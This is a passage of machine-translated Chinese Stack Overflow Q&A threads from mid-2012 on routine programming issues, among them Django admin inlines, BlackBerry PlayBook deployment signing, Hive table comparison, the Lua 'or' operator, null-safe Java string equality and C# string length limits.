我的 C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework.NETFramework 现在应该有一个 4.5 文件夹，但它没有。此外，我无法在 Visual Studio 中将我的任何项目更改为 4.5，据推测我也可以这样做。[我在这里](http://www.hanselman.com/blog/NETVersioningAndMultiTargetingNET45IsAnInplaceUpgradeToNET40.aspx)关注了 Scott Hanselman 的博客，但没有得到相同的结果。

此外，我的一位实习生今天做了同样的事情，并在他自己的机器上得到了完全相同的结果。

最终我想做的就是运行 EF 5，这样我就可以得到 fricken 枚举！我认为我必须有 4.5 才能做到这一点。

谢谢！

# django - Django Admin 内联和架构设计

> ID：11271522
> 
> 赞同：2
> 
> 时间：2012-06-30T04:53:57.470
> 
> 标签：django, django-models, django-admin

我的愿望是有一个通用的位置模型，然后让需要位置的各种更高级别的模型引用它。

我想在管理员中向我的用户展示一个多部分表单（内联），允许他们输入发布者和建筑物的更高级别信息，以及每个部分的位置信息。内联系统似乎不想以这种方式工作。

显然，我做错了什么，因为这对我来说似乎是一个非常标准的问题。我的架构设计很无聊吗？

我在愚蠢地使用内联系统吗？我不想为每个上层对象做 Location 的子类，因为我想以不同的方式操作位置，而与拥有它们的任何高级对象无关（邮件列表或地理查找）

```
models.py:
...
class Location(models.Model):
    """
    A geographical address
    """
# Standard Location stuff   
    address_line1 = models.CharField("Address line 1", max_length = 45, null=True, blank=True)
    ...

class Publisher(models.Model):
    """
    Contains Publisher information for publishers of yearbooks.  Replaces Institution from 1.x
    """
    name =  models.CharField(max_length=100, null=False, help_text="Name of publisher, e.g. University of Kansas")
    groups = models.ManyToManyField(Group, help_text="Select groups that this publisher owns.  Usually just one, but multiple groups are possible.")
    is_active = models.BooleanField(help_text="Check this box to enable this publisher.")
    location = models.OneToOneField(Location)
    ...

class Building(models.Model):
    """
    Contains Building Information
    """
    name =  models.CharField(max_length=100, null=False, help_text="Name of building, e.g. Physical Sciences")
    is_active = models.BooleanField(help_text="Check this box to enable this building.")
    location = models.OneToOneField(Location)
    ...

admin.py:
...
class LocationInline(generic.GenericStackedInline):
    model = Location
    max_num = 1
    extra = 1

class PublisherAdmin(admin.ModelAdmin):
    model = Publisher
    inlines = [ LocationInline,
    ]

class BuildingAdmin(admin.ModelAdmin):
    model = Building
    inlines = [ LocationInline,
    ]

admin.site.register(Publisher, PublisherAdmin)
admin.site.register(Building, BuildingAdmin) 
```

我可以通过将其添加到 Location 模型来强制内联加载和呈现：

```
# Support reverse lookup for admin  
    object_id    = models.PositiveIntegerField()
    content_type = models.ForeignKey(ContentType)
    of           = generic.GenericForeignKey('content_type', 'object_id' ) 
```

但是当我这样做时，即使我确实得到了一个内联对象，并且可以编辑它，这种关系对我来说似乎是倒退的，Location 将一个 id 存储到创建它的对象中。

欢迎任何帮助，无论是推荐的架构更改以使一切都完美地工作（因为 Django 非常擅长），或者是使看起来向后的东西有意义的技巧。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:31:07.837

首先，我认为您想要 ForeignKey，而不是 OneToOneField。否则，您不妨将您的位置字段添加到 Publisher 和 Building 模型中。然后，您只需在建筑和发布者管理中获得一个下拉菜单来选择位置和一个添加新位置的链接（如果需要）。

如果您真的希望每个建筑物/发布者拥有一个位置实例，您将无法将其编辑为内联，因为内联模型需要有一个指向父模型的 ForeignKey，除非您添加通用外键。这不是“向后” - 当您希望对象能够将自己附加到任何其他对象时，这是一个有效的选项，无论类型如何。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T10:47:57.630

对于域模型，没有“一种正确的方法”可以做到这一点，这取决于您的特定应用程序的要求。

wrt/你的问题：

OneToOne 字段将您的模型限制为每个模型实例一个位置，这（正如 Greg 提到的）在*概念上*与仅将 Location 的字段直接粘贴在模型中没有太大区别。wrt/ DRY/factorisation/reuse 等，你也可以使用模型继承来完成这项工作，拥有一个抽象的（或者如果它对你的应用程序有意义的话，最终是具体的）位置模型。

ForeignKey 解决方案仍将您的 Publisher 和 Building 模型限制在单个位置（可能 - 或不是 - 您想要的），但给定的位置可能会在不同的 Publisher 和/或 Building 实例之间共享。这意味着编辑一个给定的位置将反映所有相关的实例（注意这里不需要的副作用）。

在 Location 模型中使用 GenericForeignKey 意味着给定的位置实例属于一个*且仅属于一个*相关对象。与上述解决方案一样，没有令人惊讶的副作用，但您可能有具有相同值的重复位置（即一个用于建筑物，一个用于发布者），并且您将无法查找特定位置的所有相关对象（或至少不是那么容易）。此外，这不会阻止 Publisher 或 Building 实例拥有多个位置，这又一次可能没问题。wrt/ Location 实例“存储它们所属对象的 id”，嗯，这就是这个设计选择的真正含义：一个 Location “属于”某个其他对象，句号。

无论如何，围绕 Django 管理应用程序的默认行为进行设计可能不是最明智的做法。**您必须首先决定什么对这个**应用程序有意义（并且您可能对 Publishers 和 Buildings 有不同的需求），然后可能扩展管理员以满足您的需求。

# installation - 将调试应用程序部署到剧本会给出“失败 881 所需的签名丢失（RDK，作者）”

> ID：11271533
> 
> 赞同：5
> 
> 时间：2012-06-30T04:56:15.010
> 
> 标签：installation, code-signing, blackberry-playbook

我正在使用 Marmalade 构建 PlayBook 应用程序，但我认为我的问题一般适用于 PlayBook 应用程序。我已成功创建 debugtoken.bar 文件并将其安装在我的设备上。当我尝试在设备上安装构建的 application.bar 文件时，我得到：

```
 [execute] "blackberry-deploy.bat -device 192.168.1.114 -password ******* -installApp -package deployments\default\playbook\release\Quote Unquote.bar"
Info: Sending request: Install
Info: Action: Install
Info: File size: 6400334
Info: Installing ...
Info: Processing 6400334 bytes
actual_dname::
actual_id::
actual_version::
result::failure 881 required signatures missing (RDK, AUTHOR)
ERROR: error running blackberry-deploy
***ERROR*** 
```

请注意，这是运行标准 PlayBook 安装程序的 Marmalade 部署工具。

我不明白的是：我认为使用 debugtoken.bar 文件的目的是您可以安装未签名的应用程序。事实上，我已经使用 Marmalade 部署工具成功地部署了这些未签名的应用程序，就像这样。但是我在签署应用程序以进行分发时遇到了问题，所以我回去从头开始做所有事情，从 RIM 请求新的代码签名密钥，创建一个新的 debugtoken.bar 文件并安装它等等。现在我的情况比我以前是因为我现在什至无法安装到设备上。

再说一遍：我的理解是 debugtoken.bar 的目的是能够在实际签署 application.bar 以进行分发之前部署到设备。那么这个错误消息是什么意思呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T06:30:08.863

回答我自己的问题：

为了将“调试”版本部署到设备，拥有

```
Application-Development-Mode: true 
```

在 .bar 文件的 MANIFEST.MF 中。

一个愚蠢的错误，但我会留下这个，以防它帮助任何人......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:40:33.650

查看 QNX 部署插件“C:\Marmalade\6.1\s3e\deploy\plugins\qnx\qnx.py”，我发现如果给出了“playbook_keystore”，则“FOR DEVELOPMENT”选项为假，所以我只是清除了果酱系统部署工具上的签名部分，它不再尝试对其进行签名

# windows - 安装 Windows 内核模式驱动程序需要网络访问？

> ID：11271538
> 
> 赞同：-2
> 
> 时间：2012-06-30T04:56:39.603
> 
> 标签：windows, kernel, windows-kernel

我正在尝试为自己获得证书，支付 200 美元才能获得它。在我去购买之前，有人知道安装内核模式驱动程序（需要对代码进行签名）是否必须具有网络访问权限，它如何验证真实性？等等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:06:14.760

不需要网络访问。通过检查数字签名和证书本身来验证真实性。网络访问仅用于更新证书吊销列表（以防任何证书已被吊销），并且不会因为无法更新 CRL 而导致操作失败。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T08:36:26.570

您不需要购买证书来测试 Windows 驱动程序，您可以打开测试签名模式。查看[http://msdn.microsoft.com/en-us/library/windows/hardware/ff547660(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff547660(v=vs.85).aspx)了解更多信息。

# git - 在 github 中添加 .gitattributes 文件后所有文件都更改了吗？

> ID：11271541
> 
> 赞同：1
> 
> 时间：2012-06-30T04:57:03.990
> 
> 标签：git, github, msysgit, assembla

我有一个我最初使用的 git 存储库`msysgit`，但现在我已经开始使用`github`了。由于某种原因，当我添加默认推荐`.gitattributes`文件来处理行尾时，存储库中的大部分文件都需要重新提交。这应该发生吗？我目前在 Windows 计算机上，并使用[Assembla.com](http://assembla.com)作为中央源仓库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:01:23.360

这取决于您在您的`.gitattributes`

从[gitattributes 文档](http://www.kernel.org/pub/software/scm/git/docs/gitattributes.html)：

> 行尾转换
> 
> 虽然 git 通常会单独保留文件内容，但它可以配置为将存储库中的行结尾规范化为 LF，并且可以选择在文件签出时将它们转换为 CRLF。

因此，似乎有某些配置会修改文件的内容以更改其行尾，从而导致存储库希望您提交更改。

# java - 在这个大数据中选择的方法/算法

> ID：11271543
> 
> 赞同：0
> 
> 时间：2012-06-30T04:57:09.397
> 
> 标签：java, sql, hadoop, mapreduce, hive

这是 Hive 中的一张表 - 它包含有关我们正在购买的物品的信息。

```
CREATE EXTERNAL TABLE IF NOT EXISTS Table1
(
UID BIGINT,
ITEMS_PURCHASED ARRAY<STRUCT<PRODUCT_ID: BIGINT,TIMESTAMPS:STRING>>
) 
```

这就是上表中的数据——

```
1015826235 [{"product_id":220003038067,"timestamps":"1340321132000"},{"product_id":300003861266,"timestamps":"1340271857000"},{"product_id":140002997245,"timestamps":"1339694926000"},{"product_id":200002448035,"timestamps":"1339172659000"},{"product_id":260003553381,"timestamps":"1339072514000"}] 
```

这是 Hive 中的第二个表 - 它还包含有关我们正在购买的项目的信息。

```
CREATE EXTERNAL TABLE IF NOT EXISTS Table2
(
ITEM_ID BIGINT,
CREATED_TIME STRING,
BUYER_ID BIGINT
) 
```

这是上面第二个表中的数据

```
220003038067   2012-06-21  1015826235
300003861266   2012-06-21  1015826235
140002997245   2012-06-14  1015826235
200002448035   2012-06-08  1015826235
260003553381   2012-06-07  1015826235 
```

问题陈述 **- 我们需要根据 UID( 和 BUYER_ID) 比较上述两个表。作为一个表（表 1）中的 UID 和第二个表（表 2）中的 BUYER_ID，它们都是相同的。所以我需要看看 UID 和 BUYER_ID 是否匹配，然后 Table1 表中的 ITEMS_PURCHASED 应该与 Table2 表中的 ITEM_ID 和 CREATED_TIME 相同，如果它们（意味着 ITEMS_PURCHASED 和 ITEM_ID，CREATED_TIME）不一样，那么我需要做点什么。我可以生成一些报告，说明多少百分比数据是准确的，多少是不准确的。**

所以只是为了更清楚-

**ITEMS_PURCHASED 是 Table1 表中的 Struct 数组，它包含两个东西 PRODUCT_ID 和 TIMESTAMPS。如果 UID 和 BUYER_ID 匹配，则 Table1 中的 PRODUCT_ID 应与 Table2 中的 ITEM_ID 匹配，Table1 中的 TIMESTAMPS 应与 Table2 中的 CREATED_TIME 匹配。**

还有一件事，这些表中有数百万个数据。我已将其减少到只有一条记录以简化问题。

我想我需要为此写一些 MapReduce 工作。这是我第一次使用 Hive、Hadoop 和 Map Reduce。所以这就是我面临很多问题的原因。

我在想两个解决方案-

1) 通过比较用户 ID 和购买者 ID 来检查数百万条数据

2）或采样一些UID和buyer_id然后比较数据。

3）还有其他方法吗？

任何建议将不胜感激

# java - 相交 2 个二叉树 - 引发 Stack Overflow 错误

> ID：11271544
> 
> 赞同：0
> 
> 时间：2012-06-30T04:57:11.050
> 
> 标签：java, binary-search-tree

> **可能重复：**
> [2 个二叉树的交集引发 Stack Overflow 错误](https://stackoverflow.com/questions/11271206/intersection-of-2-binary-trees-throws-stack-overflow-error)
> [Java Binary Search Trees](https://stackoverflow.com/questions/11271645/java-binary-search-trees)

我需要返回一个新的 OrderedSet，其中包含两个二叉树的重叠元素。我认为这是引发错误的私有 OrderedSet，至少这是 eclipse 告诉我的。

```
private OrderedSet<E> resultIntersect = new OrderedSet<E>();

public OrderedSet<E> intersection(OrderedSet<E> other) {
    OrderedSet<E> result = new OrderedSet<E>();
    result = resultIntersect;
    return result;
}

private void intersection(OrderedSet<E> other, TreeNode t) {
    if (other.contains(t.data)) {
        resultIntersect.insert(t.data);
    }
    if(t.left != null)
        intersection(other, t.left);
    if(t.right != null)
        intersection(other, t.right);
} 
```

**编辑

我似乎无法让它正确返回。如何让私有方法正确返回结果？

```
 public OrderedSet<E> intersection(OrderedSet<E> other) {
    OrderedSet<E> result = new OrderedSet<E>();
    result = intersection(other, root, result);
    return result;
}

private OrderedSet<E> intersection(OrderedSet<E> other, TreeNode t, OrderedSet<E> result) {
    if (other.contains(t.data)) {
        result.insert(t.data);
    }
    if (t.left != null && t.right != null)
        return intersection(other, t.left, result) + intersection(other, t.right, result);
    if (t.left != null)
        intersection(other, t.left, result);
    if (t.right != null)
        return intersection(other, t.right, result);
    else
        return result;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T07:51:45.330

我在你的[另一个问题](https://stackoverflow.com/questions/11271645/java-binary-search-trees/11272364#11272364)中回答了，但为了完整起见，又来了。

* * *

尽管您没有提及它，并且您发布的代码也没有包含它，但我猜`OrderedSet<E> resultIntersection`是`OrderedSet<E>`. 在这种情况下，当您创建它的新实例时，`OrderedSet<E>`会创建另一个`OrderedSet<E>`要分配给的实例`resultIntersection`。然后有它自己`resultIntersection`的需要`OrderedSet<E>`创建的实例，依此类推......

解决方法是删除`resultIntersection`并找到其他一些实施方式`intersection`。在不需要时通过操纵共享状态来让方法传递数据通常是不好的做法，因为这会使逻辑更难以遵循并且可能导致多线程问题。

# java - 如果 MappedByteBuffer 的大小在执行 FileChannel.map() 时大于文件长度会发生什么

> ID：11271546
> 
> 赞同：1
> 
> 时间：2012-06-30T04:57:40.377
> 
> 标签：java, memory-mapped-files

我正在尝试将 randomaccessfile 映射到内存，然后想要附加一些数据。 `MappedByteBuffer buffer = file.getChannel().map(MapMode.READ_WRITE, 0, size);`

如果 ?会发生什么`size > file.length`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T07:56:46.380

这个问题的答案在 Javadoc 中：

> 当请求的区域未完全包含在此通道的文件中时，此方法的行为未指定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T07:53:19.650

你可以试试但是..

如果内存映射的结尾超出文件的现有结尾，它将增大文件。

如果您无法以 READ_WRITE 身份访问该文件，则无论大小如何，您都会收到异常。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-12T14:39:35.630

我在 Mac 上运行 Java 8，它引发了`java.io.IOException: Channel not open for writing - cannot extend file to required size`.

如果没有特别的理由分配超过文件大小，您总是可以使用三元来快速选择较小的。

# if-statement - Lua 有 OR 比较吗？

> ID：11271547
> 
> 赞同：23
> 
> 时间：2012-06-30T04:57:46.727
> 
> 标签：if-statement, lua, logic

我刚开始使用 Lua，我想知道（因为我在网站上找不到）Lua 是否有 OR 运算符，就像其他语言中的 || 一样：

```
if (condition == true || othercondition == false) {
 somecode.somefunction();
} 
```

而在 Lua 中，有

```
if condition then
    x = 0
end 
```

我将如何在 Lua 中编写一个 IF 块来使用 OR？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-06-30T05:01:14.967

用“或”。

```
if condition or not othercondition then
    x = 0
end 
```

正如 Lua 手册明确指出的那样。

# php - Socket 服务器在页面上显示接收到的数据

> ID：11271548
> 
> 赞同：0
> 
> 时间：2012-06-30T04:57:50.503
> 
> 标签：php, sockets, buffering

我需要一个脚本来监听连接并输出接收到的数据。我试过以下代码：

```
header('Content-Type: text/plain; charset=utf-8');
$socket = stream_socket_server("tcp://0.0.0.0:8000", $errno, $errstr);
if (!$socket) {
    echo "$errstr ($errno)\n";
} else {
    while ($conn = stream_socket_accept($socket)) {
        $data = fread($conn, 100);
        var_dump($data);
        flush();
        fclose($conn);
    }
    fclose($socket);
} 
```

基于这个例子：php.net/manual/en/function.stream-socket-server.php

问题是当客户端连接并发送一些数据时，页面上没有任何内容。使用缓冲预防技术`ob_implicit_flush()`，甚至`output_buffering = Off`在 php.ini 中设置也无济于事。浏览器中的缓冲可能会导致这种情况，还有什么我应该尝试的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T18:05:33.257

正如我所想，这是由于 Chrome 浏览器仅在连接关闭时才显示输出。不幸的是，似乎没有简单的方法可以在 Chrome 中改变这种行为。

# c - 声明和定义之间的数组/指针不匹配——然后会发生什么？

> ID：11271550
> 
> 赞同：1
> 
> 时间：2012-06-30T04:58:03.033
> 
> 标签：c

我正在通过 C 并来到以下示例，我无法从“C 上的指针”一书中理解。这是代码。

以下声明存在于一个源文件中：

```
int     a[10];
int     *b = a; 
```

但是在不同的源文件中，这段代码是这样写的：

```
extern         int    *a;
extern         int    b[];
int            x, y;
...
x = a[3];
y = b[3]; 
```

有人可以解释执行两个赋值语句时会发生什么吗？（假设整数和指针都占用四个字节。）

当我尝试运行代码时，它给了我分段错误`x`，当我将它注释掉并打印 y 的值时，它给了我 0。这个概念是指针和数组之间的一些区别。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T05:06:20.007

发生的是未定义的行为，在您的情况下，这表现为分段错误。

你很可能想要这个：

```
int     a[10];
int     *b = a;

extern         int    *b;
extern         int    a[]; 
```

然后你的两个任务都将获取`a`索引 3 处的元素并将其放入`x`and`y`中。

# c++ - 计算二分图中的路径数（长度 N）

> ID：11271552
> 
> 赞同：2
> 
> 时间：2012-06-30T04:58:21.427
> 
> 标签：c++, algorithm, graph-theory, graph-algorithm, bipartite

我目前正在通过进行深度优先搜索（最多 10 个级别）来计算二分图中长度为 $n$ 的路径数。但是，我的实现需要 5 分钟以上的时间才能从具有 3000 多个元素的二部图中计算出 700 万条长度为 5 的路径。我正在寻找一种更有效的方法来解决这个计数问题，我想知道文献中是否有这样的算法。

这些是无向二部图，因此路径中可能存在循环。

我的目标是计算在一分钟内包含 100 万个元素的二分图中长度为 $n$ 的路径的数量。

提前感谢您提供任何建议的答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T06:44:14.070

我同意第一个想法，但它并不完全是 BFS。在 BFS 中，您通过每个节点一次，在这里您可以进行很多次。
您必须保留 2 个数组（我们称其为 Cnt1 和 Cnt2，Cnt1 是您到达一个元素的次数并且您的路径长度为 i，Cnt2 相同，但长度为 i + 1）。第一次，所有元素在 Cnt2 中为 0，在 Cnt1 中为 1（因为从每个节点开始都有一条长度为零的路径）。

重复 N 次：
遍历所有节点
对于当前节点，您遍历所有连接的节点，并为每个您在 Cnt2 上的位置添加您到达 Cnt1 中当前节点的次数。
当您完成所有节点后，您只需将 Cnt2 复制到 Cnt1 并将 Cnt2 设为零。
最后，您只需添加 Cnt1 的所有数字，这就是答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T05:35:16.930

转换为广度优先搜索，每当您有 2 条路径以相同长度通向同一节点时，只需跟踪有多少这样的路径，而不是如何到达那里。

这将避免大量重复工作，并且应该提供显着的加速。（如果`n`不小，有更好的加速，请继续阅读。）

*`n`我的目标是计算一分钟内包含 100 万个元素的二分图中的长度路径数。*

嗯，祝你好运？

另一种研究方法是，如果你取图的邻接矩阵，并将其提升到 n 次方，你得到的矩阵的所有条目都是从一个地方开始的长度 end 的路径数，结束在另一个。所以你可以走捷径，比如重复平方。方便，不是吗？

不幸的是，一百万个元素图会产生一个具有 10^12 个条目的邻接矩阵。用简单算法将两个这样的矩阵相乘应该需要 10^18 次操作。当然，我们有更好的矩阵乘法算法，但你仍然没有低于 10^15 次操作。这肯定不会在 1 分钟内完成。（如果您的矩阵足够稀疏，您可能会有机会，但您应该对该主题进行一些研究。）

# c++ - 类模板的非类、非函数成员的显式特化

> ID：11271553
> 
> 赞同：1
> 
> 时间：2012-06-30T04:58:29.770
> 
> 标签：c++

看代码：

```
template <class x> struct Foo
{
    int getX(x *p) { return(0); }
    enum E12 { a };
};

template <> int Foo<int>::getX(int*)
{
    return(-15);
}

template <> enum Foo<int>::E12
{
    a, b, c
} 
```

正如在[不能重载函数](https://stackoverflow.com/questions/11268535/cannot-overload-function)中讨论的那样，第一个特化是合法的，甚至在 MSVC 中也有效。而第二个专业化 for`enum`甚至不想编译，说“错误 C2988：无法识别的模板声明/定义”。

在我看来，C++ 正在为方法制造相对不合逻辑的例外。枚举只是一个例子。同样的事情可以应用于成员类、类型定义等。

我会很高兴有人对此发表评论。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:15:52.537

这是 C++11 一个非常不起眼的新特性。向 Microsoft 提交错误报告，尽管它不太可能被优先考虑，因为几乎没有人知道这是允许的。正确的语法是

```
template <class x> struct Foo
{
    int getX(x *p) { return(0); }
    enum E12 { a };
};

template <> int Foo<int>::getX(int*)
{
    return(-15);
}

template <> enum Foo<int>::E12
{
    a, b, c
}; 
```

我已经向 GCC[提交了一个错误](http://gcc.gnu.org/bugzilla/show_bug.cgi?id=53815)。有人可以测试最近的 Clang 吗？

* * *

在 C++03 中，只有类和函数可以显式特化。从标准，C++03 14.7.3/1：

> 以下任何一项的明确专业化：
> 
> *   功能模板
> *   类模板
> *   类模板的成员函数
> *   类模板的静态数据成员
> *   类模板的成员类
> *   类或类模板的成员类模板
> *   类或类模板的成员函数模板
> 
> 可以通过引入的声明来声明`template<>`

成员枚举不是这种情况。（一般来说，一个`enum`类型总是在第一次声明时只定义一次。）

要获得模板化的`enum`or `typedef`，您可以将其包装在类模板中。在您的情况下，它将是`Foo`. 这样的构造称为元函数。

C++11 也有别名模板，类似于模板化的 typedef，但它们不能显式特化。

* * *

只允许类和函数被特化，然后允许这样的模板封装其他的东西，比如`enum`and `typedef`，对我来说似乎比允许直接特化`enum`. 但是，也许语言正朝着您喜欢的方向发展。

# java - 将 Java 中的两个对象与可能的空值进行比较

> ID：11271554
> 
> 赞同：253
> 
> 时间：2012-06-30T04:58:47.803
> 
> 标签：java

我想比较两个字符串是否相等，或者两者都可以`null`。

所以，我不能简单地调用`.equals()`，因为它可以包含`null`值。

到目前为止我尝试过的代码：

```
boolean compare(String str1, String str2) {
  return ((str1 == str2) || (str1 != null && str1.equals(str2)));
} 
```

检查所有可能值的最佳方法是什么，包括`null`？

* * *

## 回答 #1

> 赞同：431
> 
> 时间：2012-06-30T07:40:28.817

从 Java 7 开始，您可以使用静态方法[`java.util.Objects.equals(Object, Object)`](http://docs.oracle.com/javase/7/docs/api/java/util/Objects.html#equals%28java.lang.Object,%20java.lang.Object%29)对两个对象执行相等检查，而无需关心它们是否为`null`.

如果两个对象都是`null`它会返回`true`，如果一个是`null`而另一个不是它会返回`false`。否则，它将返回[`equals`](http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#equals%28java.lang.Object%29)以第二个作为参数调用第一个对象的结果。

* * *

## 回答 #2

> 赞同：211
> 
> 时间：2012-06-30T05:11:22.397

这是 Java 内部代码使用的（在其他`compare`方法上）：

```
public static boolean compare(String str1, String str2) {
    return (str1 == null ? str2 == null : str1.equals(str2));
} 
```

* * *

## 回答 #3

> 赞同：50
> 
> 时间：2012-06-30T05:24:00.057

对于这些情况，最好使用[Apache Commons](http://commons.apache.org/lang/) [StringUtils#equals](https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringUtils.html#equals(java.lang.String,%20java.lang.String))，它已经处理空字符串。代码示例：

```
public boolean compare(String s1, String s2) {
    return StringUtils.equals(s1, s2);
} 
```

如果您不想添加库，只需复制方法的源[代码](http://grepcode.com/file/repo1.maven.org/maven2/commons-lang/commons-lang/2.6/org/apache/commons/lang/StringUtils.java#StringUtils.equals%28java.lang.String%2Cjava.lang.String%29)`StringUtils#equals`并在需要时应用即可。

* * *

## 回答 #4

> 赞同：29
> 
> 时间：2015-06-21T11:13:19.983

对于那些不能使用 API 19 的 Objects.equals(str1, str2) 的 android 用户，有这样的：

```
android.text.TextUtils.equals(str1, str2); 
```

它是空安全的。它很少需要使用更昂贵的 string.equals() 方法，因为由于[Android 的字符串池](https://developer.android.com/reference/java/lang/String.html)化，Android 上的相同字符串几乎总是与 "==" 操作数比较为真，并且长度检查是过滤掉大多数不匹配的快速方法。

源代码：

```
/**
 * Returns true if a and b are equal, including if they are both null.
 * <p><i>Note: In platform versions 1.1 and earlier, this method only worked  well if
 * both the arguments were instances of String.</i></p>
 * @param a first CharSequence to check
 * @param b second CharSequence to check
 * @return true if a and b are equal
 */
public static boolean equals(CharSequence a, CharSequence b) {
    if (a == b) return true;
    int length;
    if (a != null && b != null && (length = a.length()) == b.length()) {
        if (a instanceof String && b instanceof String) {
            return a.equals(b);
        } else {
            for (int i = 0; i < length; i++) {
                if (a.charAt(i) != b.charAt(i)) return false;
            }
            return true;
        }
    }
    return false;
} 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2016-11-22T15:15:03.157

自 3.5 版以来，Apache Commons StringUtils 具有以下方法：

```
static int  compare(String str1, String str2)
static int  compare(String str1, String str2, boolean nullIsLess)
static int  compareIgnoreCase(String str1, String str2)
static int  compareIgnoreCase(String str1, String str2, boolean nullIsLess) 
```

这些提供空安全字符串比较。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2019-02-14T11:28:13.140

使用**Java 8：**

```
private static Comparator<String> nullSafeStringComparator = Comparator
        .nullsFirst(String::compareToIgnoreCase); 

private static Comparator<Metadata> metadataComparator = Comparator
        .comparing(Metadata::getName, nullSafeStringComparator)
        .thenComparing(Metadata::getValue, nullSafeStringComparator);

public int compareTo(Metadata that) {
    return metadataComparator.compare(this, that);
} 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2018-06-10T11:34:27.283

使用 Apache Commons StringUtils 类的 equals(-,-) 和 equalsIgnoreCase(-,-) 方法比较两个字符串。

**StringUtils.equals(-, -)**：

```
StringUtils.equals(null, null)   = true
StringUtils.equals(null, "abc")  = false
StringUtils.equals("abc", null)  = false
StringUtils.equals("abc", "abc") = true
StringUtils.equals("abc", "ABC") = false 
```

**StringUtils.equalsIgnoreCase(-, -)**：

```
StringUtils.equalsIgnoreCase(null, null)   = true
StringUtils.equalsIgnoreCase(null, "abc")  = false
StringUtils.equalsIgnoreCase("xyz", null)  = false
StringUtils.equalsIgnoreCase("xyz", "xyz") = true
StringUtils.equalsIgnoreCase("xyz", "XYZ") = true 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2016-02-08T08:10:07.023

您可以使用 `java.util.Objects`如下。

```
public static boolean compare(String str1, String str2) {
    return Objects.equals(str1, str2);
} 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-06-30T05:02:51.307

```
boolean compare(String str1, String str2) {
    if(str1==null || str2==null) {
        //return false; if you assume null not equal to null
        return str1==str2;
    }
    return str1.equals(str2);
} 
```

这是你想要的吗？

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-06-30T05:06:01.967

```
boolean compare(String str1, String str2) {
    if (str1 == null || str2 == null)
        return str1 == str2;

    return str1.equals(str2);
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-06-30T05:10:29.730

```
boolean compare(String str1, String str2) {
  return (str1==null || str2==null) ? str1 == str2 : str1.equals(str2);
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2012-06-30T05:25:54.333

好的，那么“最佳解决方案”是什么意思？

如果您的意思是最易读，那么对于有经验的 Java 程序员来说，所有可能的解决方案都差不多。但 IMO 最易读的是这个

```
 public boolean compareStringsOrNulls(String str1, String str2) {
     // Implement it how you like
 } 
```

换句话说，将实现隐藏在一个（理想情况下）可以内联的简单方法中。

（您也可以“外包”到第 3 方实用程序库……如果您已经在代码库中使用它。）

* * *

如果您的意思是性能最高，那么：

1.  最高效的解决方案取决于平台和上下文，
2.  `null`“上下文”问题之一是参数出现的相对（动态）频率，
3.  哪个版本更快可能并不重要......因为差异可能太小而无法影响整体应用程序性能，*并且*
4.  如果它确实重要，找出在您的平台上最快的唯一方法是尝试两个版本并测量差异。

# c# - 字符串变量字符限制

> ID：11271557
> 
> 赞同：2
> 
> 时间：2012-06-30T04:59:04.657
> 
> 标签：c#, string, variables

我的 String 变量只存储 4096 个字符，我需要存储更多，我该如何实现？

下面是我想要做的

```
ServiceController[] myServices = ServiceController.GetServices();
String ServiceList = "";

foreach (ServiceController service in myServices)
{

      ServiceList += service.DisplayName + "|||";

} 
return ServiceList; 
```

返回变量时，它只存储 4096 个字符，其余的被修剪掉。

PS 我需要将它们放在一个变量中，因为我正在用它们制作一个 URL 并传递给我的网络服务。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T05:01:56.357

> 我需要将它们放在一个变量中，因为我正在用它们制作一个 URL 并传递给我的 web 服务。

不，不要那样做！

4096 个字符的 URL 是一个非常糟糕的主意，并且不能保证有效。

> 极长的 URL 通常是一个错误。超过 2,000 个字符的 URL 将无法在最流行的网络浏览器中使用。如果您打算让您的网站为大多数 Internet 用户服务，请不要使用它们。

[（资源）](http://www.boutell.com/newfaq/misc/urllength.html)

创建一个包含 id 的缩短 URL。将其余信息存储在以短 id 作为键的数据库中。

**有关的**

*   [不同浏览器中 URL 的最大长度是多少？](https://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url)
*   [Internet Explorer 中的最大 URL 长度为 2,083 个字符](http://support.microsoft.com/kb/208427)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:03:28.623

.NET 字符串长度限制为 20 亿个字符。

浏览器确实对它们接受的 URL 的长度有限制，并且不同浏览器实现的长度限制是不同的。IE 的限制通常是最短的，我上次在 IE6 时代检查时约为 2k。Firefox 和 Chrome 远高于此，但仍有限制。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T05:02:22.870

C# 中的字符串有大约 2Gig 的限制。所以你的字符串变量没有问题

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T05:04:09.363

